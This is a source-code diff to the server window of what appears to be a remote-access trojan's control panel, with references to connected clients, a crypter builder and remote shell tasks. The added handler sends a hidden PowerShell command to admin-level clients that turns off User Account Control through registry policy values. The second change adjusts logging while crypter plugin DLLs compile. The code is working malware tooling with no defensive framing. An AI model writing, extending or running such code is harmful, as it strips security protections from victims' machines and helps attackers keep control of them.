@@ -969,6 +969,25 @@ public partial class ServerWindow : Window
             Dispatcher.BeginInvoke(() => Log($"[+] Block WSReset sent to {clients.Count} client(s)."));
         });
     }
+    private async void QuickDisableUac_Click(object sender, RoutedEventArgs e)
+    {
+        var clients = GetSelectedClients();
+        if (clients.Count == 0 || _server == null) return;
+        var adminClients = clients.Where(c => c.IsAdmin).ToList();
+        if (adminClients.Count == 0) { Log("[!] Disable UAC: no admin clients selected."); return; }
+
+        var cmd = "powershell -NoP -NonI -W Hidden -Command \"" +
+            "$p='HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System';" +
+            "Set-ItemProperty $p EnableLUA 0 -Type DWord -Force;" +
+            "Set-ItemProperty $p ConsentPromptBehaviorAdmin 0 -Type DWord -Force;" +
+            "Set-ItemProperty $p ConsentPromptBehaviorUser 0 -Type DWord -Force;" +
+            "Set-ItemProperty $p PromptOnSecureDesktop 0 -Type DWord -Force\"";
+
+        var pkt = new Protocol.Packet { Type = Protocol.PacketType.AutoTaskShell, Data = cmd };
+        foreach (var c in adminClients)
+            await _server.SendToClient(c.Id, pkt);
+        Log($"[+] Disable UAC sent to {adminClients.Count} admin client(s) (takes effect after reboot).");
+    }
     #pragma warning restore CS4014
 
     private TikTokWindow? _tikTokWindow;
@@ -2938,9 +2957,10 @@ Read-Host 'Press Enter to close'
             else
                 Log($"[*] AutoTask: Compiling {taskName} plugin...");
 
-            // Run on thread pool — GetVsEnvironment() calls WaitForExit() synchronously
-            // which would block the UI thread when awaited back on the WPF SynchronizationContext.
-            bytes = await Task.Run(() => Builder.CrypterBuilder.CompilePluginDllAsync(cppSource, extraLibs, Log));
+            // Thread-safe log: CompilePluginDllAsync runs on the thread pool (to avoid blocking
+            // the UI thread in GetVsEnvironment/FindClExe), so we marshal log calls back to UI.
+            Action<string> safeLog = msg => Dispatcher.BeginInvoke(() => Log(msg));
+            bytes = await Task.Run(() => Builder.CrypterBuilder.CompilePluginDllAsync(cppSource, extraLibs, safeLog));
             if (bytes == null)
             {
                 Log($"[!] AutoTask: {taskName} compile failed — task not added.");
